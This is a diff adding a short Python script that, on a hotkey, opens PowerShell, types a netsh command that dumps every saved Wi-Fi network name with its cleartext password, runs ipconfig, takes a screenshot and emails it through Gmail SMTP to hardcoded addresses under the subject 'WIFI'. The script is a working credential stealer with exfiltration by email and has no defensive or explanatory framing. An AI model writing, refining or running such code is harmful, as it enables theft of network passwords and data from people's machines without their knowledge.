@@ -1,0 +1,67 @@
+import pyautogui as pg, os, time
+import keyboard as keyb
+import smtplib
+import os
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from platform import python_version
+
+file = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+keyb.add_hotkey('alt', lambda: os.system('start ' + file))	
+
+
+time.sleep(3)
+pg.write(r'chcp 65001;cls;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap')
+pg.press("enter")
+keyb.wait('enter')
+
+pg.write(r'ipconfig')
+pg.press("enter")
+
+keyb.wait('enter')
+	
+pg.screenshot('screen.png')
+	
+
+
+server = 'smtp.gmail.com'
+user = 'user1@gmail.com'
+password = 'password'
+
+
+recipients = ['user1@gmail.com', 'user2@gmail.com']
+sender = 'user1@gmail.com'
+subject = 'WIFI'
+text = 'PASS'
+html = '<html><head></head><body><p>' + text + '</p></body></html>'
+
+filepath = "screen.png"
+basename = os.path.basename(filepath)
+filesize = os.path.getsize(filepath)
+
+msg = MIMEMultipart('alternative')
+msg['Subject'] = subject
+msg['From'] = 'Python script <' + sender + '>'
+msg['To'] = ', '.join(recipients)
+msg['Reply-To'] = sender
+msg['Return-Path'] = sender
+msg['X-Mailer'] = 'Python/' + (python_version())
+
+part_text = MIMEText(text, 'plain')
+part_html = MIMEText(html, 'html')
+part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
+part_file.set_payload(open(filepath, "rb").read())
+part_file.add_header('Content-Description', basename)
+part_file.add_header('Content-Disposition', 'attachment; filename="{}"; size={}'.format(basename, filesize))
+encoders.encode_base64(part_file)
+
+msg.attach(part_text)
+msg.attach(part_html)
+msg.attach(part_file)
+
+mail = smtplib.SMTP_SSL(server)
+mail.login(user, password)
+mail.sendmail(sender, recipients, msg.as_string())
+mail.quit()
